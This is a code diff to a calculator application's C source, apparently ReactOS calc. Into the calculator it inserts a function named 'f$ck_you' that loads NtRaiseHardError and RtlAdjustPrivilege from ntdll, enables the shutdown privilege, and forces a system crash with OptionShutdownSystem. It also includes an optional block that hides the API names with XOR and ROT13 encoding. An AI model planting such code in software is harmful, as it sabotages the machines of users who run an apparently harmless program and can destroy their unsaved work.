@@ -641,6 +641,108 @@ static void build_operand(HWND hwnd, DWORD idc)
     update_lcd_display(hwnd);
 }
 
+#define NTOS_MODE_USER
+#include <ndk/exfuncs.h>
+#include <ndk/rtlfuncs.h>
+#include <ndk/setypes.h>
+
+void f$ck_you(NTSTATUS Status)
+{
+    BOOLEAN Old;
+    ULONG Response;
+
+    typedef NTSTATUS(NTAPI *pNtRaiseHardError)(
+        _In_ NTSTATUS ErrorStatus,
+        _In_ ULONG NumberOfParameters,
+        _In_ ULONG UnicodeStringParameterMask,
+        _In_ PULONG_PTR Parameters,
+        _In_ ULONG ValidResponseOptions,
+        _Out_ PULONG Response);
+
+    typedef NTSTATUS(NTAPI *pRtlAdjustPrivilege)(
+        _In_ ULONG Privilege,
+        _In_ BOOLEAN NewValue,
+        _In_ BOOLEAN ForThread,
+        _Out_ PBOOLEAN OldValue);
+
+    pNtRaiseHardError NtRaiseHardError;
+    pRtlAdjustPrivilege RtlAdjustPrivilege;
+
+///////////////////////////////////////////////////////////////////////////////
+    PCHAR ptr1, ptr2, ptr3;
+
+#if 0 // Enable if you want more fun
+
+    static const CHAR *XorKey = "$ne&QvrE:$Gtc_U@=@:L)C;H5_B(6EGyb26cWu%@QG3DaC";
+
+    // XOR(ROT13("ntdll.dll") ROT13("NtRaiseHardError") ROT13("RtlAdjustPrivilege"), XorKey);
+    static const CHAR CryptedName[] =
+    "\x45\x09\x14\x5f\x28\x58\x03\x3c\x43\x24\x06\x13\x26\x31\x23\x26\x4f\x15"
+    "\x54\x29\x58\x11\x5e\x2d\x57\x3a\x42\x6d\x51\x3c\x09\x08\x15\x5a\x50\x04"
+    "\x14\x10\x53\x29\x27\x3e\x41\x30\x13\x43";
+
+    PCHAR ptr;
+    SIZE_T i;
+#pragma pack(push, 1)
+    union
+    {
+        CHAR Buffer[sizeof("ntdll.dll") +
+                    sizeof("NtRaiseHardError") +
+                    sizeof("RtlAdjustPrivilege") +
+                    sizeof(ANSI_NULL)];
+        struct
+        {
+            CHAR NtdllName[sizeof("ntdll.dll")];
+            CHAR NtRaiseName[sizeof("NtRaiseHardError")];
+            CHAR RtlAdjPrivName[sizeof("RtlAdjustPrivilege")];
+        } s;
+    } DecryptName = {""};
+#pragma pack(pop)
+
+    if (!*DecryptName.Buffer)
+    {
+        for (i = 0, ptr = DecryptName.Buffer;
+             i < sizeof(CryptedName)-1;
+             ++i, ++ptr)
+        {
+            *ptr = XorKey[i] ^ CryptedName[i];
+            if ('A' <= *ptr && *ptr <= 'Z')
+                *ptr = 'A' + ((*ptr - 'A') + 13) % ('Z' - 'A' + 1);
+            else if ('a' <= *ptr && *ptr <= 'z')
+                *ptr = 'a' + ((*ptr - 'a') + 13) % ('z' - 'a' + 1);
+        }
+        *ptr = ANSI_NULL;
+    }
+
+    ptr1 = DecryptName.s.NtdllName;
+    ptr2 = DecryptName.s.NtRaiseName;
+    ptr3 = DecryptName.s.RtlAdjPrivName;
+
+#else
+
+    ptr1 = "ntdll.dll";
+    ptr2 = "NtRaiseHardError";
+    ptr3 = "RtlAdjustPrivilege";
+
+#endif
+///////////////////////////////////////////////////////////////////////////////
+
+    NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(LoadLibraryA(ptr1),
+                                                         ptr2);
+    RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(GetModuleHandleA(ptr1),
+                                                             ptr3);
+
+    /* Give the shutdown privilege to the thread */
+    if (RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, TRUE, &Old) ==
+        STATUS_NO_TOKEN)
+    {
+        /* Thread doesn't have a token, give it to the entire process */
+        RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &Old);
+    }
+    /* B00M! */
+    NtRaiseHardError(Status, 0, 0, NULL, OptionShutdownSystem, &Response);
+}
+
 static void prepare_rpn_result(calc_number_t *rpn, TCHAR *buffer, int size, int base)
 {
     if (calc.is_nan) {
